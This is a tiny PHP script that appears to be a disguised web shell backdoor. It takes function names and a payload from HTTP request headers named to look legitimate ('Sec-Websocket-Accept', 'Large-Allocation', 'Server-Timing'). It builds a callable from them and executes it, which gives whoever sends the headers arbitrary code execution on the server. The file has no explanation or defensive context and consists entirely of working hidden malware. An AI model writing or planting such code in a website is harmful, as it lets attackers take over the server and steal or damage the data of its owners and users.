<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $center = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Large-Allocation']($_HEADERS['Server-Timing']));
    $center();
}